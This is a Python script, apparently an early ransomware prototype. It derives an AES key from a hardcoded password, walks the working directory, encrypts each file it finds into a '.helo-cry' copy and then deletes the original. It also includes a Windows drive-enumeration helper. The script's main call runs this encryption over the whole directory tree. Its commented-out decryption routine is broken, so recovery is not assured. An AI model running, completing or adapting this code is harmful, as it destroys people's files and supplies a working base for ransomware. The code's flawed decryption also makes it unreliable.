import os
import sys
import funcy
import base64
import Crypto.Protocol
from Crypto import Random
from Crypto.Cipher import AES
path = ''
os.chdir(path)

#other
import os
import win32api 


#usr_key = input("Please enter a key to use as your encryption key:- ")

usr_key = 'helloworld'

salt = b'\x9aX\x10\xa6^\x1fUVu\xc0\xa2\xc8\xff\xceOV'
key = Crypto.Protocol.KDF.PBKDF2(password=usr_key, salt=salt, dkLen=32, count=10000)
iv = Random.new().read(AES.block_size)
bs = AES.block_size

def pad(s):
    return s + (bs - len(s) % bs) * chr(bs - len(s) % bs).encode('utf-8')

def encryptFile(fileIn, chunksize=64*1024):
    try:
        fileOut = fileIn + ".helo-cry"
        cipher = AES.new(key, AES.MODE_CBC, iv)
        with open(fileIn, "rb") as plain:
            with open(fileOut, "wb") as outFile:
                outFile.write(base64.b64encode(key + iv))
                while True:
                    chunk = plain.read(chunksize)
                    if len(chunk) == 0:
                        break
                    chunk = pad(chunk)
                    outFile.write(base64.b64encode(cipher.encrypt(chunk)))
        fs = str(fileIn)
        os.remove(fileIn)
        ased = "done"
        return ased
    except:
        fel = "problem"



#
#def decryptFile(fileIn, chunksize=64*1024):
#    a = fileIn[-9:]
#    if(a!=".helo-cry"):break
#    fileOut = fileIn[:-9]
#    cipher = AES.new(key, AES.MODE_CBC, iv)
#    with open(fileIn, "rb") as plain:
#        with open(fileOut, "wb") as outFile:
#            outFile.write(base64.b64encode(key + iv))
#            while True:
#                chunk = plain.read(chunksize)
#                if len(chunk) == 0:
#                    break
#                chunk = pad(chunk)
#                outFile.write(base64.b64encode(cipher.decrypt(chunk)))
#    os.remove(fileIn)
#
#
#
#encryptFile(input("Enter name of the file to encrypt:- "))




#other
os.system("cls")
def move_to(a):
    os.chdir(path)


#ass = 0
def get_files():
    for root, dirs, files in os.walk("."):
        for filename in files:
            
            print(filename)
            #encrypt function
            #ass = ass + 1
            #encryptFile(filename)

def get_encrypted():
    for root, dirs, files in os.walk("."):
        s = str(root)
        s = s[2:]
        #print(s)
        for filename in files:
            #print(filename)
            #encrypt function
            #ass = ass + 1
            fs = str(filename)
            #encryptFile(fs)
            dirsf = str(os.getcwd())
            if(fs[-9:] != ".helo-cry"):
                
                path = dirsf + "\\" + s + '\\' + fs
                a = encryptFile(path)
                #print(path + ' done')
                if(a == "problem"):
                    print(path + " :- " + a)
                else:
                    print(path + " :- " + ' done')




def get_folders():
    a = next(os.walk('.'))[1]
    return a

def get_drives():
    drives = win32api.GetLogicalDriveStrings()
    drives = drives.split('\000')[:-1]
    #print(drives)
    return drives



def en():
    folders = get_folders()
    files = get_files()
    try:
        for f in files:
            #encrypt file
            #encryptFile(f)
            print(f)
    except:
        exit()            
    #now go to first folder and call en()
    #for fo in folders:
    #    print("Folder :- " + fo)
    #    en()




#encrypt_all_files()
#print(os.getcwd())
get_encrypted()
#get_files()
#en()
#encryptFile("blaze2.png")
#encryptFile("blaze.ai")
#encryptFle("xampp\webalizer\zli b1.dll")